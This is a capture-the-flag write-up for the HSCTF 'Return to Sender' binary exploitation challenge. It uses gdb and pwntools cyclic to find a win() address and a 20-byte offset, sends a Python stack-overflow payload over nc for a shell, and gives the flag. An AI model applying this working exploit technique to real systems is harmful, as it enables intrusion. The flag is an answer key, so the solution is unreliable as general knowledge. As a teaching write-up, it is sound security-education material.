# Return to Sender
Binary Exploitation

## Challenge 

	Who knew the USPS could lose a letter so many times?

	nc pwn.hsctf.com 1234

	6/3/19 7:34 AM: Updated binary, SHA-1: 104fb76c3318fb44130c4a8ee50ac1a2f52d4082 return-to-sender

	This might come in handy: https://en.wikipedia.org/wiki/Stack_buffer_overflow

## Solution

Get address of win()

	$ gdb return-to-sender 
	(gdb) info add win
	Symbol "win" is at 0x80491b6 in a file compiled without debugging.

Fuzz for offset length

	# pwn cyclic 100 | strace ./return-to-sender
	--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x61616166} ---

	# pwn cyclic -l 0x61616166
	20

Craft payload

	# (python -c "import struct; print('A'*20 + struct.pack('<I', 0x80491b6))"; cat) | nc pwn.hsctf.com 1234

	ls
	cat flag
	hsctf{fedex_dont_fail_me_now}

## Flag

	hsctf{fedex_dont_fail_me_now}
